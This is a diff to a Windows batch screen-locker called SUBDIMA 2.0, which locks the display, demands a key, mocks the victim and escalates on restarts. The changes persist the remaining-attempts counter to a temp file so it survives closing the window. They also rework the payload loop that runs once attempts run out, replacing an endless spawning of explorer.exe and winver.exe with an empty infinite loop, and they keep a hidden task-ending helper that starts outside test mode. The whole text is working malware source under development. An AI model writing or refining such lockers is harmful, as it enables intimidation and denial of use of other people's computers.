@@ -8,7 +8,7 @@
 @echo off
 title SUBDIMA 2.0
 echo %* | findstr /I "tstmd"
-if /I "%errorlevel%" == "0" (
+if /I %errorlevel% == 0 (
 set test=1
 title SubDima 2.0 TEST MODE
 )
@@ -56,17 +56,19 @@ exit
 
 :firstinit
 echo Preparing first initialization...
-set attempts=3
-if /I "%test%" == "0" start "" /min "%tmp%\SUBDIMA\taskender.bat" strt
+echo 3 > "%tmp%\SUBDIMA\attempts"
+set /p attempts=<"%tmp%\SUBDIMA\attempts"
+if /I %test% == 0 start "" /min "%tmp%\SUBDIMA\taskender.bat" strt
 echo Generating random key...
 set key=%random%
 cls
 goto :code
 
 :restarted
-::if /I "%attempts%" LSS "1" goto :noattempts
+set /p attempts=<"%tmp%\SUBDIMA\attempts"
+if /I %attempts% LSS 1 goto :noattempts
 set /p restarts=< "%tmp%\SUBDIMA\count"
-if /I "%restarts%" == "1 " (
+if /I %restarts% == 1 (
 echo Oh shit, you actually closed me!!
 echo I guess Ill change the code and give you only 1 attempt hehe
 set attempts=1
@@ -75,26 +77,38 @@ timeout /t 3 /nobreak > nul
 cls
 goto :code
 )
-if /I "%restarts%" == "2 " (
+if /I %restarts% == 2 (
+if /I %attempts% == 1 (
+echo Welp... I warned you and even gave you a second chance
+echo yet you continued...
+set attempts=0
+echo 0 > "%tmp%\SUBDIMA\attempts"
+timeout /t 2 /nobreak > nul
+cls
+goto :noattempts
+)
 echo I RECOMMEND YOU STOP DOING THAT OR FACE THE CONSEQUENCES
 echo THIS IS YOUR LAST WARNING
 set attempts=1
+echo 1 > "%tmp%\SUBDIMA\attempts"
 set key=%random%%random%%random%%random%
 timeout /t 3 /nobreak > nul
 cls
 goto :code
 )
-if /I "%restarts%" == "3 " (
+if /I %restarts% == 3 (
 echo I WARNED YOU...
+set attempts=0
+echo 0 > "%tmp%\SUBDIMA\attempts"
 timeout /t 2 /nobreak > nul
 cls
-goto :code
+goto :noattempts
 )
 
 ::============================== Main ==============================
 
 :code
-if /I "%attempts%" LSS "1" goto :noattempts
+if /I %attempts% LSS 1 goto :noattempts
 echo. THIS COMPUTER HAS BEEN LOCKED BY SUBDIMA
 echo.
 echo. Don't worry, your files are still there.. if you have a key
@@ -119,12 +133,15 @@ if /I "%test%" == "0" (
         echo Whaha, you actually found the emergency key!
         timeout /t 3 /nobreak > nul
         echo Though this is not test mode, YOU'RE FUCKED HAHAHA
+	set /a attempts=%attempts%-1
+	echo %attempts% > "%tmp%\SUBDIMA\attempts"
         timeout /t 4 /nobreak > nul
         cls
         goto :code
     )
 )
-set /a "attempts=%attempts%-1"
+set /a attempts=%attempts%-1
+echo %attempts% > "%tmp%\SUBDIMA\attempts"
 cls
 goto :code
 
@@ -141,9 +158,10 @@ goto :remove
 
 :payload
 echo. > "%tmp%\SUBDIMA\stop-taskend.pls"
-start "" explorer.exe
-start "" winver.exe
-goto :payload
+:load
+::start "" explorer.exe
+::start "" winver.exe
+goto :load
 
 ::============================== Removal ==============================
 
